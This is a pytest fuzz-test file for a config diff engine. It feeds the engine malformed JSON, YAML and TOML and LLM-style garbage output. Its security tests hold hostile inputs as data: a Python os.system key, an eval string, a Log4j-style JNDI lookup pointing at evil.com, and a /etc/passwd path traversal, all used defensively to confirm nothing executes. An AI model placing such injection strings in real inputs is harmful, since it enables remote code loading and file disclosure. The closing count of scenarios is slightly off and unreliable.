# test_smart_diff_fuzz.py
"""
Fuzz tests for Smart Diff - testing robustness against malformed/adversarial inputs.
Focus on real-world MCP CLI scenarios with LLM-generated garbage.
"""

import pytest
import json
from core.semantic_diff import SemanticDiffEngine

# Initialize engine
engine = SemanticDiffEngine()


# ============================================================================
# CATEGORY 1: Format Confusion
# ============================================================================

class TestFormatConfusion:
    """Test handling of mixed or ambiguous format indicators"""
    
    def test_json_with_yaml_syntax(self):
        """JSON object with YAML-style key:value"""
        confused = '{"name": "value"\nkey: value}'
        # Should detect ambiguous format and raise ValueError
        with pytest.raises(ValueError) as exc_info:
            engine.compare_2way(confused, confused, "auto")
        assert "ambiguous" in str(exc_info.value).lower()
        assert "json" in str(exc_info.value).lower()
        assert "yaml" in str(exc_info.value).lower()
    
    def test_json_with_yaml_separator(self):
        """JSON followed by YAML document separator"""
        confused = '[1, 2, 3]\n---\nkey: value'
        result = engine.compare_2way(confused, '[]', "auto")
        # Should pick one format or fail gracefully
        assert isinstance(result.success, bool)
    
    def test_toml_mixed_with_json(self):
        """TOML and JSON in same input"""
        confused = 'name = "value"\n{"json": true}'
        result = engine.compare_2way(confused, confused, "auto")
        # Should pick one format or fail gracefully
        assert not result.success or result.format in ["toml", "json", "yaml"]
    
    def test_env_with_json_value(self):
        """ENV file with JSON as value"""
        confused = 'CONFIG={"nested": "json"}'
        result = engine.compare_2way(confused, confused, "env")
        # ENV format should handle this
        assert result.success or result.error is not None


# ============================================================================
# CATEGORY 2: Malformed Syntax
# ============================================================================

class TestMalformedSyntax:
    """Test handling of syntactically invalid inputs"""
    
    def test_unbalanced_brackets(self):
        """Unbalanced JSON brackets"""
        malformed_inputs = [
            '{{{',
            '}}}',
            '{"key": "value"}}}',
            '{{{{"key": "value"}',
            '[1, 2, 3]]',
        ]
        
        for malformed in malformed_inputs:
            result = engine.compare_2way(malformed, '{}', "json")
            if result.success:
                # Auto-repair might have fixed it
                assert result.format == "json"
            else:
                # Should have clear error
                assert result.error is not None
                assert len(result.error) > 0
    
    def test_unclosed_quotes(self):
        """JSON with unclosed string quotes"""
        malformed = '{"name": "value'
        result = engine.compare_2way(malformed, '{}', "json")
        
        # Should fail with clear error
        if not result.success:
            assert "Invalid" in result.error or "quote" in result.error.lower()
    
    def test_invalid_escape_sequences(self):
        """JSON with invalid escape sequences"""
        malformed_escapes = [
            '{"key": "\\x"}',      # Invalid hex escape
            '{"key": "\\u"}',      # Incomplete Unicode escape
            '{"key": "\\"}',       # Trailing backslash
        ]
        
        for malformed in malformed_escapes:
            result = engine.compare_2way(malformed, '{}', "json")
            # Either succeeds (permissive parsing) or fails with error
            assert result.success or result.error is not None
    
    def test_mixed_line_endings(self):
        """Config with mixed CRLF/LF/CR line endings"""
        mixed = '{"line1": "value"}\r\n{"line2": "value"}\n{"line3": "value"}\r'
        result = engine.compare_2way(mixed, '{}', "json")
        # Newlines shouldn't affect JSON parsing
        assert isinstance(result.success, bool)
    
    def test_null_bytes_in_content(self):
        """Content with null bytes"""
        with_nulls = '{"key": "val\x00ue"}'
        result = engine.compare_2way(with_nulls, '{}', "json")
        # Should handle or reject gracefully
        assert isinstance(result.success, bool)


# ============================================================================
# CATEGORY 3: Extreme Values
# ============================================================================

class TestExtremeValues:
    """Test handling of extreme/pathological inputs"""
    
    def test_deeply_nested_structure(self):
        """JSON with 100+ levels of nesting"""
        deep = "{"
        for i in range(100):
            deep += f'"level{i}": {{'
        deep += '"value": 42'
        deep += "}" * 101
        
        result = engine.compare_2way(deep, deep, "json")
        # Should either handle it or have recursion limit
        assert result.success or ("recursion" in result.error.lower() if result.error else False)
    
    def test_very_long_key_name(self):
        """JSON with extremely long key (10KB)"""
        long_key = "k" * 10000
        config = json.dumps({long_key: "value"})
        
        result = engine.compare_2way(config, config, "json")
        # Should handle long keys
        assert result.success
    
    def test_huge_array(self):
        """JSON with large array (10K elements)"""
        huge_array = json.dumps(list(range(10000)))
        
        result = engine.compare_2way(huge_array, huge_array, "json")
        # Should handle large arrays
        assert result.success
        assert result.similarity_score == 100.0
    
    def test_unicode_edge_cases(self):
        """Tricky Unicode scenarios"""
        unicode_cases = [
            '{"emoji": "🚀🎉💻"}',                    # Emoji
            '{"rtl": "مرحبا بك"}',                     # RTL Arabic
            '{"combining": "é"}',                       # Combining diacritics
            '{"zero_width": "hello\u200Bworld"}',     # Zero-width space
        ]
        
        for case in unicode_cases:
            result = engine.compare_2way(case, case, "json")
            assert result.success, f"Failed on: {case[:50]}"


# ============================================================================
# CATEGORY 4: LLM-Generated Garbage
# ============================================================================

class TestLLMGarbage:
    """Test real-world LLM output errors"""
    
    def test_markdown_fence_with_json(self):
        """LLM wraps JSON in markdown code fence"""
        llm_output = '```json\n{"name": "value", "port": 8080}\n```'
        
        result = engine.compare_2way(llm_output, '{"clean": true}', "json")
        # Should either extract JSON or fail clearly
        assert result.success or result.error is not None
    
    def test_prose_mixed_with_json(self):
        """LLM includes explanatory prose"""
        llm_output = 'Here is the configuration file:\n\n{"port": 8080, "host": "localhost"}'
        
        result = engine.compare_2way(llm_output, '{}', "json")
        # Should handle or report clear error
        assert isinstance(result.success, bool)
    
    def test_incomplete_json_truncated(self):
        """LLM output truncated mid-JSON"""
        truncated_outputs = [
            '{"name": "value", "items": [1, 2, 3',          # Missing closing
            '{"config": {"port": 8080, "host":',            # Incomplete value
            '{"a": 1, "b": 2,',                             # Trailing comma, no close
        ]
        
        for truncated in truncated_outputs:
            result = engine.compare_2way(truncated, '{}', "json")
            # Auto-repair might fix trailing comma, otherwise should error
            assert result.success or result.error is not None
    
    def test_extra_trailing_commas(self):
        """LLM adds extra commas"""
        with_commas = '{"name": "value",,,}'
        
        result = engine.compare_2way(with_commas, '{"name": "value"}', "json")
        # Auto-repair should fix this
        if result.success:
            assert result.summary.get("modified", 0) == 0  # Should see them as identical
    
    def test_mixed_quote_styles(self):
        """LLM mixes single/double quotes"""
        mixed_quotes = "{name: 'value', \"age\": 30}"
        
        result = engine.compare_2way(mixed_quotes, '{}', "json")
        # Either JSON5 handles it or fails with clear error
        assert isinstance(result.success, bool)
    
    def test_comments_in_json(self):
        """LLM adds comments to JSON"""
        with_comments = '''
        {
            // Configuration file
            "port": 8080,  // Server port
            /* Database settings */
            "db": "postgres"
        }
        '''
        
        result = engine.compare_2way(with_comments, '{}', "json5")
        # JSON5 format should handle comments
        assert result.success or "json5" in result.error.lower()


# ============================================================================
# CATEGORY 5: MCP CLI Real-World Scenarios
# ============================================================================

class TestMCPCLIScenarios:
    """Test actual MCP CLI usage patterns"""
    
    def test_ai_agent_config_update_with_typo(self):
        """AI agent sends config with typo that gets auto-fixed"""
        before = '{"port": 3000, "host": "localhost"}'
        after = '{"port": 8080, "host": "localhost",}'  # Trailing comma typo
        
        result = engine.compare_2way(before, after, "json")
        
        # Should auto-repair and show actual changes
        if result.success:
            assert result.summary.get("modified", 0) >= 1  # At least port changed
    
    def test_empty_config_comparison(self):
        """Comparing empty configs"""
        result = engine.compare_2way('{}', '{}', "json")
        
        assert result.success
        assert result.similarity_score == 100.0
        assert len(result.changes) == 0
    
    def test_null_vs_missing_key(self):
        """Distinguishing null value from missing key"""
        before = '{"key": null}'
        after = '{}'
        
        result = engine.compare_2way(before, after, "json")
        
        assert result.success
        assert result.summary.get("removed", 0) == 1  # Key was removed
    
    def test_array_order_changes(self):
        """Array element reordering"""
        before = '{"tags": ["a", "b", "c"]}'
        after = '{"tags": ["c", "b", "a"]}'
        
        result = engine.compare_2way(before, after, "json")
        
        assert result.success
        # Order matters by default, should detect change
        assert len(result.changes) > 0
    
    def test_large_config_performance(self):
        """Large config shouldn't hang"""
        import time
        
        # Generate 1000-key config
        large = {f"key_{i}": f"value_{i}" for i in range(1000)}
        large_json = json.dumps(large)
        
        start = time.time()
        result = engine.compare_2way(large_json, large_json, "json")
        elapsed = time.time() - start
        
        assert result.success
        assert elapsed < 3.0, f"Took too long: {elapsed}s"


# ============================================================================
# CATEGORY 6: Security/Safety Tests
# ============================================================================

class TestSecurity:
    """Ensure diff engine doesn't execute code or have injection risks"""
    
    def test_no_code_execution_in_keys(self):
        """Malicious code in keys shouldn't execute"""
        malicious_inputs = [
            '{"__import__(\'os\').system(\'ls\')": "value"}',
            '{"eval(\'1+1\')": "value"}',
            '{"${jndi:ldap://evil.com}": "value"}',  # Log4j-style
        ]
        
        for malicious in malicious_inputs:
            result = engine.compare_2way(malicious, '{}', "json")
            # Should parse as literal strings, not execute
            assert isinstance(result.success, bool)
            # No actual system calls should happen (this is runtime assertion)
    
    def test_no_path_traversal_in_values(self):
        """Path traversal attempts in values"""
        path_traversal = '{"file": "../../../../etc/passwd"}'
        result = engine.compare_2way(path_traversal, '{}', "json")
        
        # Should treat as literal string
        assert isinstance(result.success, bool)


# ============================================================================
# Test Suite Summary
# ============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
    
    print("\n" + "="*70)
    print("FUZZ TEST COVERAGE SUMMARY")
    print("="*70)
    print("✅ Format Confusion: 4 scenarios")
    print("✅ Malformed Syntax: 6 scenarios")
    print("✅ Extreme Values: 4 scenarios")
    print("✅ LLM Garbage: 6 scenarios")
    print("✅ MCP CLI Real-World: 5 scenarios")
    print("✅ Security: 2 scenarios")
    print("="*70)
    print(f"Total: 27 fuzz test scenarios")
